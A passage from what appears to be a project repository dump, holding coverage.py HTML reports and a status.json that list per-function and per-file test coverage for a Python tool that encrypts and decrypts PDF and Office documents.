                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t51"><data value='test_password'>OfficeDocumentHandler.test_password</data></a></td>
                <td>14</td>
                <td>14</td>
                <td>0</td>
                <td class="right" data-ratio="0 14">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t79">src\core\crypto_handlers\office_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t79"><data value='encrypt_file'>OfficeDocumentHandler.encrypt_file</data></a></td>
                <td>5</td>
                <td>5</td>
                <td>0</td>
                <td class="right" data-ratio="0 5">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t109">src\core\crypto_handlers\office_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t109"><data value='decrypt_file'>OfficeDocumentHandler.decrypt_file</data></a></td>
                <td>13</td>
                <td>13</td>
                <td>0</td>
                <td class="right" data-ratio="0 13">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t136">src\core\crypto_handlers\office_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t136"><data value='cleanup'>OfficeDocumentHandler.cleanup</data></a></td>
                <td>1</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="0 1">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html">src\core\crypto_handlers\office_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>16</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="14 16">88%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t23">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t23"><data value='init__'>PDFHandler.__init__</data></a></td>
                <td>6</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="5 6">83%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t35">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t35"><data value='configure'>PDFHandler.configure</data></a></td>
                <td>2</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="2 2">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t43">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t43"><data value='test_password'>PDFHandler.test_password</data></a></td>
                <td>10</td>
                <td>4</td>
                <td>0</td>
                <td class="right" data-ratio="6 10">60%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t69">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t69"><data value='encrypt_file'>PDFHandler.encrypt_file</data></a></td>
                <td>13</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="11 13">85%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t100">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t100"><data value='decrypt_file'>PDFHandler.decrypt_file</data></a></td>
                <td>20</td>
                <td>7</td>
                <td>0</td>
                <td class="right" data-ratio="13 20">65%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t137">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t137"><data value='cleanup'>PDFHandler.cleanup</data></a></td>
                <td>1</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="0 1">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>14</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="12 14">86%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t52">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t52"><data value='init__'>FileValidator.__init__</data></a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t57">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t57"><data value='validate_file'>FileValidator.validate_file</data></a></td>
                <td>10</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="9 10">90%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t95">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t95"><data value='detect_file_format'>FileValidator._detect_file_format</data></a></td>
                <td>16</td>
                <td>4</td>
                <td>0</td>
                <td class="right" data-ratio="12 16">75%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t138">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t138"><data value='validate_file_access_and_size'>FileValidator._validate_file_access_and_size</data></a></td>
                <td>13</td>
                <td>5</td>
                <td>0</td>
                <td class="right" data-ratio="8 13">62%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t172">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t172"><data value='detect_encryption_status'>FileValidator._detect_encryption_status</data></a></td>
                <td>15</td>
                <td>7</td>
                <td>0</td>
                <td class="right" data-ratio="8 15">53%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t211">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t211"><data value='init__'>FileProcessor.__init__</data></a></td>
                <td>5</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="5 5">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t219">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t219"><data value='process_files'>FileProcessor.process_files</data></a></td>
                <td>18</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="18 18">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t263">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t263"><data value='process_single_file'>FileProcessor._process_single_file</data></a></td>
                <td>29</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="27 29">93%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t327">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t327"><data value='validate_output_file'>FileProcessor._validate_output_file</data></a></td>
                <td>20</td>
                <td>8</td>
                <td>0</td>
                <td class="right" data-ratio="12 20">60%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t368">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t368"><data value='detect_encryption_status_for_validation'>FileProcessor._detect_encryption_status_for_validation</data></a></td>
                <td>14</td>
                <td>6</td>
                <td>0</td>
                <td class="right" data-ratio="8 14">57%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t387">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t387"><data value='move_to_final_location'>FileProcessor._move_to_final_location</data></a></td>
                <td>17</td>
                <td>8</td>
                <td>0</td>
                <td class="right" data-ratio="9 17">53%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t427">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t427"><data value='calculate_checksum'>FileProcessor._calculate_checksum</data></a></td>
                <td>4</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="2 4">50%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t461">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t461"><data value='init__'>ResultsReporter.__init__</data></a></td>
                <td>2</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="2 2">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t465">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t465"><data value='generate_report'>ResultsReporter.generate_report</data></a></td>
                <td>7</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="7 7">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t485">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t485"><data value='print_results_summary'>ResultsReporter._print_results_summary</data></a></td>
                <td>14</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="14 14">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t508">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t508"><data value='determine_exit_code'>ResultsReporter._determine_exit_code</data></a></td>
                <td>10</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="8 10">80%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>54</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="54 54">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58___init___py.html">src\core\password\__init__.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58___init___py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>2</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="2 2">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t18">src\core\password\password_manager.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t18"><data value='init__'>PasswordManager.__init__</data></a></td>
                <td>6</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="6 6">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t38">src\core\password\password_manager.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t38"><data value='load_password_list'>PasswordManager._load_password_list</data></a></td>
                <td>10</td>
                <td>6</td>
                <td>0</td>
                <td class="right" data-ratio="4 10">40%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t58">src\core\password\password_manager.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t58"><data value='get_password_candidates'>PasswordManager.get_password_candidates</data></a></td>
                <td>14</td>
                <td>3</td>
                <td>0</td>
                <td class="right" data-ratio="11 14">79%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t96">src\core\password\password_manager.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t96"><data value='find_working_password'>PasswordManager.find_working_password</data></a></td>
                <td>10</td>
                <td>3</td>
                <td>0</td>
                <td class="right" data-ratio="7 10">70%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t123">src\core\password\password_manager.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t123"><data value='clear_passwords'>PasswordManager.clear_passwords</data></a></td>
                <td>17</td>
                <td>4</td>
                <td>0</td>
                <td class="right" data-ratio="13 17">76%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html">src\core\password\password_manager.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>9</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="9 9">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t22">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t22"><data value='init__'>SecurityValidator.__init__</data></a></td>
                <td>2</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="2 2">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t29">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t29"><data value='get_allowed_directories'>SecurityValidator._get_allowed_directories</data></a></td>
                <td>10</td>
                <td>4</td>
                <td>0</td>
                <td class="right" data-ratio="6 10">60%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t51">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t51"><data value='validate_file_path'>SecurityValidator.validate_file_path</data></a></td>
                <td>11</td>
                <td>4</td>
                <td>0</td>
                <td class="right" data-ratio="7 11">64%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t87">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t87"><data value='is_path_within_allowed_directories'>SecurityValidator._is_path_within_allowed_directories</data></a></td>
                <td>7</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="6 7">86%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t103">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t103"><data value='validate_path_components'>SecurityValidator._validate_path_components</data></a></td>
                <td>3</td>
                <td>1</td>
                <td>0</td>
                <td class="right" data-ratio="2 3">67%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t117">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t117"><data value='is_path_component_safe'>SecurityValidator._is_path_component_safe</data></a></td>
                <td>16</td>
                <td>6</td>
                <td>0</td>
                <td class="right" data-ratio="10 16">62%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t158">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t158"><data value='is_file_in_safe_zone'>SecurityValidator._is_file_in_safe_zone</data></a></td>
                <td>16</td>
                <td>7</td>
                <td>0</td>
                <td class="right" data-ratio="9 16">56%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t193">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t193"><data value='validate_output_directory'>SecurityValidator.validate_output_directory</data></a></td>
                <td>13</td>
                <td>13</td>
                <td>0</td>
                <td class="right" data-ratio="0 13">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>15</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="15 15">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be___init___py.html">src\utils\__init__.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be___init___py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t43">src\utils\config.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t43"><data value='load_configuration'>FastPassConfig.load_configuration</data></a></td>
                <td>14</td>
                <td>6</td>
                <td>0</td>
                <td class="right" data-ratio="8 14">57%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t68">src\utils\config.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t68"><data value='get_default_config'>FastPassConfig._get_default_config</data></a></td>
                <td>1</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="1 1">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t81">src\utils\config.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t81"><data value='load_from_environment'>FastPassConfig._load_from_environment</data></a></td>
                <td>9</td>
                <td>5</td>
                <td>0</td>
                <td class="right" data-ratio="4 9">44%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t98">src\utils\config.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t98"><data value='extract_cli_config'>FastPassConfig._extract_cli_config</data></a></td>
                <td>8</td>
                <td>3</td>
                <td>0</td>
                <td class="right" data-ratio="5 8">62%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_config_py.html">src\utils\config.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_config_py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>20</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="20 20">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_logger_py.html#t15">src\utils\logger.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_logger_py.html#t15"><data value='setup_logger'>setup_logger</data></a></td>
                <td>25</td>
                <td>11</td>
                <td>0</td>
                <td class="right" data-ratio="14 25">56%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_logger_py.html#t71">src\utils\logger.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_logger_py.html#t71"><data value='sanitize_error_message'>sanitize_error_message</data></a></td>
                <td>8</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="8 8">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_logger_py.html">src\utils\logger.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_logger_py.html"><data value=''><span class='no-noun'>(no function)</span></data></a></td>
                <td>8</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="8 8">100%</td>
            </tr>
        </tbody>
        <tfoot>
            <tr class="total">
                <td class="name left">Total</td>
                <td class="name left">&nbsp;</td>
                <td>905</td>
                <td>232</td>
                <td>0</td>
                <td class="right" data-ratio="673 905">74%</td>
            </tr>
        </tfoot>
    </table>
    <p id="no_rows">
        No items found using the specified filter.
    </p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
    <aside class="hidden">
        <a id="prevFileLink" class="nav" href=""></a>
        <a id="nextFileLink" class="nav" href=""></a>
        <button type="button" class="button_prev_file" data-shortcut="["></button>
        <button type="button" class="button_next_file" data-shortcut="]"></button>
        <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
    </aside>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/index.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage report</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="indexfile">
<header>
    <div class="content">
        <h1>Coverage report:
            <span class="pc_cov">74%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>f</kbd>
                        <kbd>s</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        <kbd>c</kbd>
                        &nbsp; change column sorting
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <form id="filter_container">
            <input id="filter" type="text" value="" placeholder="filter...">
            <div>
                <input id="hide100" type="checkbox" >
                <label for="hide100">hide covered</label>
            </div>
        </form>
        <h2>
                <a class="button current">Files</a>
                <a class="button" href="function_index.html">Functions</a>
                <a class="button" href="class_index.html">Classes</a>
        </h2>
        <p class="text">
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</header>
<main id="index">
    <table class="index" data-sortable>
        <thead>
            <tr class="tablehead" title="Click to sort">
                <th id="file" class="name left" aria-sort="none" data-shortcut="f">File<span class="arrows"></span></th>
                <th id="statements" aria-sort="none" data-default-sort-order="descending" data-shortcut="s">statements<span class="arrows"></span></th>
                <th id="missing" aria-sort="none" data-default-sort-order="descending" data-shortcut="m">missing<span class="arrows"></span></th>
                <th id="excluded" aria-sort="none" data-default-sort-order="descending" data-shortcut="x">excluded<span class="arrows"></span></th>
                <th id="coverage" class="right" aria-sort="none" data-shortcut="c">coverage<span class="arrows"></span></th>
            </tr>
        </thead>
        <tbody>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6___init___py.html">src\__init__.py</a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6___main___py.html">src\__main__.py</a></td>
                <td>11</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="11 11">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html">src\app.py</a></td>
                <td>156</td>
                <td>30</td>
                <td>0</td>
                <td class="right" data-ratio="126 156">81%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html">src\cli.py</a></td>
                <td>100</td>
                <td>19</td>
                <td>0</td>
                <td class="right" data-ratio="81 100">81%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41___init___py.html">src\core\__init__.py</a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26___init___py.html">src\core\crypto_handlers\__init__.py</a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html">src\core\crypto_handlers\office_handler.py</a></td>
                <td>58</td>
                <td>44</td>
                <td>0</td>
                <td class="right" data-ratio="14 58">24%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td>66</td>
                <td>17</td>
                <td>0</td>
                <td class="right" data-ratio="49 66">74%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html">src\core\file_handler.py</a></td>
                <td>251</td>
                <td>45</td>
                <td>0</td>
                <td class="right" data-ratio="206 251">82%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58___init___py.html">src\core\password\__init__.py</a></td>
                <td>2</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="2 2">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html">src\core\password\password_manager.py</a></td>
                <td>66</td>
                <td>16</td>
                <td>0</td>
                <td class="right" data-ratio="50 66">76%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html">src\core\security.py</a></td>
                <td>93</td>
                <td>36</td>
                <td>0</td>
                <td class="right" data-ratio="57 93">61%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be___init___py.html">src\utils\__init__.py</a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_config_py.html">src\utils\config.py</a></td>
                <td>52</td>
                <td>14</td>
                <td>0</td>
                <td class="right" data-ratio="38 52">73%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_logger_py.html">src\utils\logger.py</a></td>
                <td>41</td>
                <td>11</td>
                <td>0</td>
                <td class="right" data-ratio="30 41">73%</td>
            </tr>
        </tbody>
        <tfoot>
            <tr class="total">
                <td class="name left">Total</td>
                <td>905</td>
                <td>232</td>
                <td>0</td>
                <td class="right" data-ratio="673 905">74%</td>
            </tr>
        </tfoot>
    </table>
    <p id="no_rows">
        No items found using the specified filter.
    </p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
    <aside class="hidden">
        <a id="prevFileLink" class="nav" href="z_6156a86a215061be_logger_py.html"></a>
        <a id="nextFileLink" class="nav" href="z_145eef247bfb46b6___init___py.html"></a>
        <button type="button" class="button_prev_file" data-shortcut="["></button>
        <button type="button" class="button_next_file" data-shortcut="]"></button>
        <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
    </aside>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/status.json">
{"note":"This file is an internal implementation detail to speed up HTML report generation. Its format can change at any time. You might be looking for the JSON report: https://coverage.rtfd.io/cmd.html#cmd-json","format":5,"version":"7.10.0","globals":"70d00d6dedb1758d867edfcdbc280cb2","files":{"z_145eef247bfb46b6___init___py":{"hash":"e6baa73cda2916dad605215f937a92e1","index":{"url":"z_145eef247bfb46b6___init___py.html","file":"src\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":0,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_145eef247bfb46b6___main___py":{"hash":"0c3d8823d93ca869134212cd83f9c14c","index":{"url":"z_145eef247bfb46b6___main___py.html","file":"src\\__main__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":11,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_145eef247bfb46b6_app_py":{"hash":"dd853bb3119261d0dacf3e9d118ffcf5","index":{"url":"z_145eef247bfb46b6_app_py.html","file":"src\\app.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":156,"n_excluded":0,"n_missing":30,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_145eef247bfb46b6_cli_py":{"hash":"c16e0623849eec95929dc554387520af","index":{"url":"z_145eef247bfb46b6_cli_py.html","file":"src\\cli.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":100,"n_excluded":0,"n_missing":19,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ce21df766c911d41___init___py":{"hash":"051d3704038ecd6a2088ec78cf1aad98","index":{"url":"z_ce21df766c911d41___init___py.html","file":"src\\core\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":3,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ae6ae744f2ec6f26___init___py":{"hash":"ea15b1d4189093958558135c2a62620d","index":{"url":"z_ae6ae744f2ec6f26___init___py.html","file":"src\\core\\crypto_handlers\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":3,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ae6ae744f2ec6f26_office_handler_py":{"hash":"9f591573737d112a9c33a35a56e40d59","index":{"url":"z_ae6ae744f2ec6f26_office_handler_py.html","file":"src\\core\\crypto_handlers\\office_handler.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":58,"n_excluded":0,"n_missing":44,"n_branches":0,"n_partial_branches":0,"n_missing_branches":